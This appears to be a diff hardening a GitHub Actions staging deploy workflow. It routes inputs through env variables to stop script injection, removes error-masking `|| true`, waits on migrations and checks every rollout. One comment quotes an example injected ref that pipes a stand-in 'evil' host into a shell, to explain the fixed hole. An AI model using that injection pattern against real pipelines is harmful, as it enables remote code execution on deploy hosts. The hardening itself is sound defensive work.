@@ -84,12 +84,31 @@ jobs:
         with:
           ref: ${{ inputs.ref }}
 
+      # M44. Every value a step needs arrives through `env:`; no `${{ }}` appears
+      # inside a `run:` body anywhere below. That is not style. GitHub expands
+      # `${{ }}` when it RENDERS the script, before any shell sees it, so a
+      # quoted heredoc does not contain it and neither does shell quoting: a
+      # `workflow_dispatch` ref of `main"; curl evil|sh; #` used to be
+      # substituted verbatim into a command executed on the staging host. An
+      # `env:` value is passed as data and can only ever be a string.
       - name: Select deploy backend
         id: backend
+        env:
+          # Presence checks only — the values themselves are never echoed, and
+          # inlining a multi-line kubeconfig into a shell test would break on
+          # the first quote character it contains.
+          HAS_KUBE_CONFIG: ${{ secrets.KUBE_CONFIG != '' }}
+          HAS_SSH_HOST: ${{ secrets.STAGING_SSH_HOST != '' }}
         run: |
-          if [ -n "${{ secrets.KUBE_CONFIG }}" ]; then echo "mode=k8s" >> "$GITHUB_OUTPUT";
-          elif [ -n "${{ secrets.STAGING_SSH_HOST }}" ]; then echo "mode=ssh" >> "$GITHUB_OUTPUT";
-          else echo "::error::No deploy backend secrets configured (KUBE_CONFIG or STAGING_SSH_*)"; exit 1; fi
+          set -euo pipefail
+          if [ "$HAS_KUBE_CONFIG" = "true" ]; then
+            echo "mode=k8s" >> "$GITHUB_OUTPUT"
+          elif [ "$HAS_SSH_HOST" = "true" ]; then
+            echo "mode=ssh" >> "$GITHUB_OUTPUT"
+          else
+            echo "::error::No deploy backend secrets configured (KUBE_CONFIG or STAGING_SSH_*)"
+            exit 1
+          fi
 
       # --- A) Kubernetes ---
       - name: Deploy via kubectl
@@ -99,16 +118,47 @@ jobs:
           NS: ${{ secrets.STAGING_NAMESPACE }}
           TAG: ${{ needs.build-images.outputs.tag }}
         run: |
+          set -euo pipefail
           mkdir -p ~/.kube && echo "$KUBE_CONFIG" | base64 -d > ~/.kube/config
+
+          # M44. Record what is running BEFORE anything is rolled. ROLLBACK_PLAN
+          # §2 tells an operator to "re-point to the previous known-good digest,
+          # kept in the deploy history" — until now nothing kept it, so the
+          # documented rollback had no input. These lines are that input, and
+          # they are printed into the job summary where a person under pressure
+          # can find them.
+          echo "## Previous image tags (rollback targets)" >> "$GITHUB_STEP_SUMMARY"
+          for d in api worker web; do
+            previous="$(kubectl -n "$NS" get "deploy/$d" \
+              -o jsonpath='{.spec.template.spec.containers[0].image}')"
+            echo "- \`$d\` was \`$previous\`" >> "$GITHUB_STEP_SUMMARY"
+          done
+
           # Secrets are expected to already live in the cluster's secret store
           # (External Secrets / sealed-secrets); we only roll the image tags.
           kubectl -n "$NS" apply -f infra/k8s/            # NetworkPolicy, etc.
-          kubectl -n "$NS" set image deploy/api    api="${REGISTRY}/${IMAGE_PREFIX}/api:$TAG" || true
-          kubectl -n "$NS" set image deploy/worker worker="${REGISTRY}/${IMAGE_PREFIX}/api:$TAG" || true
-          kubectl -n "$NS" set image deploy/web    web="${REGISTRY}/${IMAGE_PREFIX}/web:$TAG" || true
-          # Expand-only migrations as a one-off Job (single runner).
-          kubectl -n "$NS" apply -f infra/k8s/jobs/migrate.yaml || echo "add infra/k8s/jobs/migrate.yaml"
-          kubectl -n "$NS" rollout status deploy/api --timeout=180s
+
+          # M44. No `|| true`. A `set image` that fails leaves that deployment
+          # on the old code, and swallowing it produced the worst possible
+          # outcome: a green deploy where `web` and `worker` never moved, with
+          # only `api` covered by the rollout check below.
+          kubectl -n "$NS" set image deploy/api    api="${REGISTRY}/${IMAGE_PREFIX}/api:$TAG"
+          kubectl -n "$NS" set image deploy/worker worker="${REGISTRY}/${IMAGE_PREFIX}/api:$TAG"
+          kubectl -n "$NS" set image deploy/web    web="${REGISTRY}/${IMAGE_PREFIX}/web:$TAG"
+
+          # M44. Expand-only migrations as a one-off Job. This previously read
+          # `apply -f infra/k8s/jobs/migrate.yaml || echo "add ..."` against a
+          # file that did not exist, so no staging deploy has ever run a
+          # migration on this path and every one of them reported success. The
+          # manifest now exists, the apply is unmasked, and the Job is waited on
+          # — a failed migration fails the deploy.
+          envsubst < infra/k8s/jobs/migrate.yaml | kubectl -n "$NS" apply -f -
+          kubectl -n "$NS" wait --for=condition=complete job/eruofood-migrate --timeout=300s
+
+          # Every deployment that was rolled is verified, not just the first.
+          for d in api worker web; do
+            kubectl -n "$NS" rollout status "deploy/$d" --timeout=180s
+          done
 
       # --- B) Compose over SSH ---
       - name: Deploy via docker compose over SSH
@@ -118,12 +168,25 @@ jobs:
           SSH_USER: ${{ secrets.STAGING_SSH_USER }}
           SSH_KEY: ${{ secrets.STAGING_SSH_KEY }}
           TAG: ${{ needs.build-images.outputs.tag }}
+          DEPLOY_REF: ${{ inputs.ref }}
         run: |
+          set -euo pipefail
           install -m 600 /dev/stdin key <<< "$SSH_KEY"
-          ssh -o StrictHostKeyChecking=accept-new -i key "$SSH_USER@$SSH_HOST" bash -s <<'REMOTE'
+
+          # M44. The ref travels as an ARGUMENT to the remote script, not as
+          # text spliced into it. `bash -s -- "$DEPLOY_REF"` puts it in `$1` on
+          # the far side, where it is data no matter what characters it holds.
+          ssh -o StrictHostKeyChecking=accept-new -i key "$SSH_USER@$SSH_HOST" \
+            bash -s -- "$DEPLOY_REF" <<'REMOTE'
             set -euo pipefail
+            ref="$1"
             cd /opt/eruofood
-            git fetch --all && git checkout --force "${{ inputs.ref }}"
+
+            # The rollback target, printed before anything changes.
+            echo "previous ref: $(git rev-parse HEAD)"
+
+            git fetch --all
+            git checkout --force "$ref"
             # .env is provisioned on the host from the secret store (infra/env/staging.env.example)
             docker compose -f docker-compose.yml -f docker-compose.staging.yml pull
             docker compose -f docker-compose.yml -f docker-compose.staging.yml up -d --wait
@@ -131,8 +194,23 @@ jobs:
           REMOTE
 
       - name: Post-deploy smoke test
+        env:
+          STAGING_URL: ${{ vars.STAGING_URL }}
         run: |
-          test -n "${{ vars.STAGING_URL }}" || { echo "::warning::set STAGING_URL to enable smoke test"; exit 0; }
-          curl -fsS "${{ vars.STAGING_URL }}/api/v1/health"
-          curl -fsS "${{ vars.STAGING_URL }}/api/v1/ready"
-          curl -fsS "${{ vars.STAGING_URL }}/api/public/v1/status"
+          set -euo pipefail
+
+          # M44. This used to `exit 0` with a warning when STAGING_URL was
+          # unset, so a deploy that was never verified reported exactly the same
+          # green tick as one that was. An unverifiable deploy is a failed
+          # deploy: the step now says what is missing and stops.
+          if [ -z "$STAGING_URL" ]; then
+            echo "::error::STAGING_URL is not set, so this deployment cannot be verified."
+            echo "Set the staging Environment variable STAGING_URL (docs/STAGING_DEPLOYMENT.md §1)."
+            exit 1
+          fi
+
+          for path in /api/v1/health /api/v1/ready /api/public/v1/status; do
+            echo "probing ${path}"
+            curl -fsS --max-time 30 "${STAGING_URL}${path}" > /dev/null
+          done
+          echo "Smoke test passed against ${STAGING_URL}."
